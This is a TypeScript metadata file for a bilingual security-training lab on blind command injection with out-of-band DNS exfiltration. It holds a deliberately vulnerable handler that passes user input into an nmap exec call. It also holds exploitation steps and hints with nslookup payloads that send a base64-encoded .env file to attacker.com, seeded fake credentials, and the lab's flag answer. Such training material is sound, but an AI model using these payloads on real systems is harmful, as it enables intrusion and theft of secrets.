// src/modules/practice-labs/command-injection/labs/lab5/lab5.metadata.ts
import type { LabMetadata } from '../../../types/lab-metadata.type';

export const cmdLab5Metadata: LabMetadata = {
  slug: 'cmdi-oob-dns-exfiltration-security-scanner',
  title: 'Command Injection: OOB DNS Exfiltration — Security Scanner API',
  ar_title: 'حقن الأوامر: سرب DNS خارج النطاق — API الماسح الأمني',
  description:
    'Exploit an advanced command injection in a security scanner API where the target URL parameter is vulnerable. The server has no direct output — use out-of-band DNS exfiltration to extract sensitive data by encoding it in DNS subdomains, then reconstruct the exfiltrated data from DNS query logs.',
  ar_description:
    'استغل حقن أوامر متقدم في API الماسح الأمني حيث معامل URL الهدف ضعيف. الخادم لا يُعيد أي ناتج مباشر — استخدم سرب DNS خارج النطاق لاستخراج البيانات الحساسة بترميزها في نطاقات DNS الفرعية، ثم أعد بناء البيانات المسربة من سجلات DNS.',
  difficulty: 'ADVANCED',
  category: 'WEB_SECURITY',
  skills: [
    'Command Injection',
    'OOB DNS Exfiltration',
    'Blind Injection',
    'Advanced Exploitation',
    'DNS Security',
  ],
  xpReward: 430,
  pointsReward: 215,
  duration: 70,
  executionMode: 'SHARED_BACKEND',
  isPublished: true,
  goal: 'The security scanner API is vulnerable to blind command injection in the target URL. Use DNS-based OOB exfiltration: inject "nslookup $(cat /app/.env | base64 | tr -d \'=\\n\').attacker.com" to exfiltrate the .env file contents via DNS queries. Retrieve the flag from the simulated DNS logs.',
  scenario: {
    context:
      'SecureScan is a security scanning API service. The /scan endpoint takes a target URL and runs: exec("nmap -sV " + targetUrl). The output is queued asynchronously and never returned directly (fully blind). Attackers use DNS OOB: inject "nslookup $(cat /app/.env | base64).attacker.com" — the server makes a DNS lookup to attacker.com with the base64-encoded file contents as a subdomain. The attacker\'s DNS server logs this query, revealing the data.',
    vulnerableCode: `// Security scanner (vulnerable — fully blind):
app.post('/scan', isAuthenticated, async (req, res) => {
  const { target } = req.body;
  // ❌ target injected into nmap command — async, no output returned
  exec(\`nmap -sV \${target}\`, (err, stdout) => {
    db.scanResults.create({ jobId, output: stdout }); // Stored, not returned
  });
  // Response sent immediately — no output!
  res.json({ jobId: uuid(), status: 'queued' });
});`,
    exploitation:
      '1. Inject: target: "example.com; nslookup $(whoami).attacker.com" → confirm OOB via DNS\n2. Inject: target: "example.com; nslookup $(cat /app/.env | base64 | tr -d \'=\').attacker.com"\n3. Check /dns/logs for the DNS query with base64-encoded .env file\n4. Decode the subdomain from base64 to get the flag',
  },
  hints: [
    {
      order: 1,
      xpCost: 30,
      content:
        'The scanner is 100% blind — no output ever. But DNS OOB works: inject "nslookup $(whoami).attacker.com". Check /dns/logs to see if a DNS query arrived.',
    },
    {
      order: 2,
      xpCost: 55,
      content:
        'DNS OOB confirmed! Now exfiltrate /app/.env: inject "nslookup $(cat /app/.env | base64 | tr -d \'=\').attacker.com". The file contents become a DNS subdomain.',
    },
    {
      order: 3,
      xpCost: 85,
      content:
        'POST /scan with { "target": "example.com; nslookup $(cat /app/.env|base64|tr -d \'=\\n\').attacker.com" }. Then POST /dns/logs to see the captured DNS query.',
    },
    {
      order: 4,
      xpCost: 120,
      content:
        'Get the subdomain from /dns/logs, base64-decode it to reveal /app/.env contents including the flag. Or use /dns/decode to do it automatically.',
    },
  ],
  flagAnswer: 'FLAG{CMDI_OOB_DNS_EXFILTRATION_ENV_FILE_SECRETS}',
  initialState: {
    contents: [
      {
        title: 'APP_ENV',
        body: JSON.stringify({
          path: '/app/.env',
          content: [
            '# SecureScan Production Environment',
            'NODE_ENV=production',
            'DATABASE_URL=postgresql://scanner:Sc4nn3r_Pr0d!@db:5432/securescan',
            'JWT_SECRET=ultra_secret_jwt_key_prod_2024',
            'AWS_ACCESS_KEY_ID=AKIA_SECURESCAN_PROD',
            'AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY',
            'STRIPE_SECRET_KEY=sk_live_abc123def456',
            'FLAG=FLAG{CMDI_OOB_DNS_EXFILTRATION_ENV_FILE_SECRETS}',
          ].join('\n'),
        }),
        author: 'system_file',
        isPublic: false,
      },
    ],
  },
};
